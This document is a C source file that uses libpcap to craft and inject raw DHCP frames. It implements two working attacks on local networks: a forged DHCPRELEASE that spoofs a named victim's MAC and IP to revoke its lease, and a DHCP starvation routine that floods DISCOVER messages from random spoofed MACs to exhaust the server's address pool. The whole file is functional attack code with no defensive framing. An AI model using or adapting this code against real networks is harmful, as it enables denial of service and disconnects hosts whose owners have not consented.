#include "wm_dhcp.h"

#include <pcap.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#pragma pack(push, 1)
typedef struct { uint8_t dst[6], src[6]; uint16_t etype; } eth_hdr_t;
typedef struct {
    uint8_t  ver_ihl;
    uint8_t  tos;
    uint16_t total_len;
    uint16_t id;
    uint16_t frag;
    uint8_t  ttl;
    uint8_t  proto;
    uint16_t csum;
    uint32_t src;
    uint32_t dst;
} ip_hdr_t;
typedef struct {
    uint16_t src_port;
    uint16_t dst_port;
    uint16_t length;
    uint16_t csum;
} udp_hdr_t;
/* Standard BOOTP/DHCP header (RFC 2131). 240 bytes fixed + variable options. */
typedef struct {
    uint8_t  op;
    uint8_t  htype;
    uint8_t  hlen;
    uint8_t  hops;
    uint32_t xid;
    uint16_t secs;
    uint16_t flags;
    uint32_t ciaddr;
    uint32_t yiaddr;
    uint32_t siaddr;
    uint32_t giaddr;
    uint8_t  chaddr[16];
    uint8_t  sname[64];
    uint8_t  bfile[128];
    uint32_t magic;        /* 0x63825363 */
} bootp_hdr_t;
#pragma pack(pop)

#define ETH_TYPE_IP    0x0800
#define IPPROTO_UDP_   17
#define DHCP_MAGIC     0x63825363
#define DHCP_OP_REQUEST 1

#define DHCP_MSG_DISCOVER 1
#define DHCP_MSG_REQUEST  3
#define DHCP_MSG_RELEASE  7

static uint16_t cksum16(const void *buf, size_t len) {
    const uint16_t *w = (const uint16_t *)buf;
    uint32_t sum = 0;
    while (len > 1) { sum += *w++; len -= 2; }
    if (len) sum += *(const uint8_t *)w;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)~sum;
}

static uint16_t udp_cksum(uint32_t src, uint32_t dst,
                          const udp_hdr_t *udp, const uint8_t *payload,
                          uint16_t udp_len) {
    static uint8_t buf[2048];
    if (udp_len + 12 > sizeof(buf)) return 0;
    int off = 0;
    memcpy(buf + off, &src, 4); off += 4;
    memcpy(buf + off, &dst, 4); off += 4;
    buf[off++] = 0;
    buf[off++] = IPPROTO_UDP_;
    uint16_t udp_len_n = htons(udp_len);
    memcpy(buf + off, &udp_len_n, 2); off += 2;
    udp_hdr_t hdr = *udp;
    hdr.csum = 0;
    memcpy(buf + off, &hdr, sizeof(hdr)); off += sizeof(hdr);
    int payload_len = udp_len - sizeof(udp_hdr_t);
    if (payload_len > 0) memcpy(buf + off, payload, payload_len);
    off += payload_len;
    if (off & 1) buf[off++] = 0;
    return cksum16(buf, off);
}

void *wm_dhcp_open(const char *iface, char *errbuf) {
    char eb[PCAP_ERRBUF_SIZE];
    pcap_t *p = pcap_create(iface, eb);
    if (!p) { snprintf(errbuf, 256, "pcap_create: %s", eb); return NULL; }
    pcap_set_snaplen(p, 96);
    pcap_set_promisc(p, 0);
    pcap_set_timeout(p, 100);
    pcap_set_immediate_mode(p, 1);
    int rc = pcap_activate(p);
    if (rc < 0) {
        snprintf(errbuf, 256, "pcap_activate: %s", pcap_geterr(p));
        pcap_close(p);
        return NULL;
    }
    return p;
}

void wm_dhcp_close(void *handle) {
    if (handle) pcap_close((pcap_t *)handle);
}

/* Build a DHCP frame in `frame` and return its length. The caller fills:
 *   - eth.src (our_mac)
 *   - ip.src / ip.dst
 *   - bootp.ciaddr / chaddr
 *   - dhcp option 53 (msg type) and any extras via `extra_opts`
 */
static int build_dhcp(uint8_t *frame, size_t cap,
                      const uint8_t our_mac[6],
                      const uint8_t client_mac[6],
                      uint32_t src_ip, uint32_t dst_ip,
                      uint32_t ciaddr,
                      uint32_t xid,
                      uint8_t  msg_type,
                      const uint8_t *extra_opts, int extra_len) {
    if (cap < 1500) return -1;
    memset(frame, 0, cap);

    /* Eth */
    eth_hdr_t *eth = (eth_hdr_t *)frame;
    static const uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    memcpy(eth->dst, bcast, 6);
    memcpy(eth->src, our_mac, 6);
    eth->etype = htons(ETH_TYPE_IP);

    /* DHCP option block: 53 + length(1) + msg_type, then extras, then 255 (END). */
    uint8_t opts[64];
    int o = 0;
    opts[o++] = 53;          /* DHCP message type */
    opts[o++] = 1;
    opts[o++] = msg_type;
    if (extra_opts && extra_len > 0 && o + extra_len < (int)sizeof(opts)) {
        memcpy(opts + o, extra_opts, extra_len);
        o += extra_len;
    }
    opts[o++] = 255;         /* END */

    /* BOOTP/DHCP body */
    int bootp_off = sizeof(eth_hdr_t) + sizeof(ip_hdr_t) + sizeof(udp_hdr_t);
    bootp_hdr_t *boot = (bootp_hdr_t *)(frame + bootp_off);
    boot->op    = DHCP_OP_REQUEST;
    boot->htype = 1;          /* Ethernet */
    boot->hlen  = 6;
    boot->hops  = 0;
    boot->xid   = xid;
    boot->secs  = 0;
    boot->flags = htons(0x0000);
    boot->ciaddr = ciaddr;
    boot->yiaddr = 0;
    boot->siaddr = 0;
    boot->giaddr = 0;
    memcpy(boot->chaddr, client_mac, 6);
    boot->magic = htonl(DHCP_MAGIC);
    int dhcp_body_len = (int)sizeof(bootp_hdr_t) + o;
    memcpy((uint8_t *)boot + sizeof(bootp_hdr_t), opts, o);

    /* UDP */
    int udp_off = sizeof(eth_hdr_t) + sizeof(ip_hdr_t);
    udp_hdr_t *udp = (udp_hdr_t *)(frame + udp_off);
    udp->src_port = htons(68);
    udp->dst_port = htons(67);
    udp->length   = htons((uint16_t)(sizeof(udp_hdr_t) + dhcp_body_len));
    udp->csum     = 0;

    /* IP */
    ip_hdr_t *ip = (ip_hdr_t *)(frame + sizeof(eth_hdr_t));
    ip->ver_ihl   = 0x45;
    ip->tos       = 0x10;
    ip->id        = htons((uint16_t)(xid & 0xffff));
    ip->frag      = htons(0x0000);
    ip->ttl       = 64;
    ip->proto     = IPPROTO_UDP_;
    ip->src       = src_ip;
    ip->dst       = dst_ip;
    int ip_total  = (int)(sizeof(ip_hdr_t) + sizeof(udp_hdr_t) + dhcp_body_len);
    ip->total_len = htons((uint16_t)ip_total);
    ip->csum      = 0;
    ip->csum      = cksum16(ip, sizeof(ip_hdr_t));

    /* UDP checksum (over pseudo-header). */
    udp->csum = udp_cksum(src_ip, dst_ip, udp,
                          frame + udp_off + sizeof(udp_hdr_t),
                          (uint16_t)(sizeof(udp_hdr_t) + dhcp_body_len));

    int total = (int)(sizeof(eth_hdr_t) + ip_total);
    if (total < 60) total = 60;
    return total;
}

int wm_dhcp_send_release(void *handle,
                         const uint8_t our_mac[6],
                         const uint8_t victim_mac[6],
                         const char   *victim_ip,
                         const char   *server_id) {
    if (!handle) return -1;
    uint32_t v_ip, s_ip;
    if (inet_pton(AF_INET, victim_ip, &v_ip) != 1) return -1;
    if (inet_pton(AF_INET, server_id, &s_ip) != 1) return -1;

    /* Option 54 (server identifier) */
    uint8_t extra[6];
    extra[0] = 54;            /* server identifier */
    extra[1] = 4;
    memcpy(&extra[2], &s_ip, 4);

    static uint32_t xid_counter = 0xC0FFEE00;
    xid_counter++;

    uint8_t frame[1500];
    int len = build_dhcp(frame, sizeof(frame),
                         our_mac, victim_mac,
                         v_ip,        /* src IP = victim's IP */
                         s_ip,        /* dst IP = DHCP server (gateway) */
                         v_ip,        /* ciaddr = victim IP */
                         htonl(xid_counter),
                         DHCP_MSG_RELEASE,
                         extra, sizeof(extra));
    if (len < 0) return -1;

    int r = pcap_inject((pcap_t *)handle, frame, len);
    if (r <= 0) {
        fprintf(stderr, "wm_dhcp[release]: pcap_inject failed: %s\n",
                pcap_geterr((pcap_t *)handle));
        fflush(stderr);
        return -1;
    }
    return 0;
}

int wm_dhcp_send_starve(void *handle, const uint8_t our_mac[6]) {
    if (!handle) return -1;

    /* Random spoofed client MAC, locally-administered bit set so it doesn't
     * collide with any real OUI. */
    uint8_t fake_mac[6];
    for (int i = 0; i < 6; i++) fake_mac[i] = (uint8_t)(arc4random() & 0xff);
    fake_mac[0] = (fake_mac[0] | 0x02) & 0xfe;

    /* Option 55 (parameter request list) — minimal, gateway+netmask. */
    uint8_t extra[5];
    extra[0] = 55;
    extra[1] = 3;
    extra[2] = 1;             /* subnet mask */
    extra[3] = 3;             /* router */
    extra[4] = 6;             /* DNS */

    uint32_t xid = arc4random();

    uint8_t frame[1500];
    int len = build_dhcp(frame, sizeof(frame),
                         our_mac, fake_mac,
                         0, 0xFFFFFFFF,  /* src 0.0.0.0, dst 255.255.255.255 */
                         0,               /* ciaddr 0 (no IP yet) */
                         xid,
                         DHCP_MSG_DISCOVER,
                         extra, sizeof(extra));
    if (len < 0) return -1;

    int r = pcap_inject((pcap_t *)handle, frame, len);
    if (r <= 0) return -1;
    return 0;
}
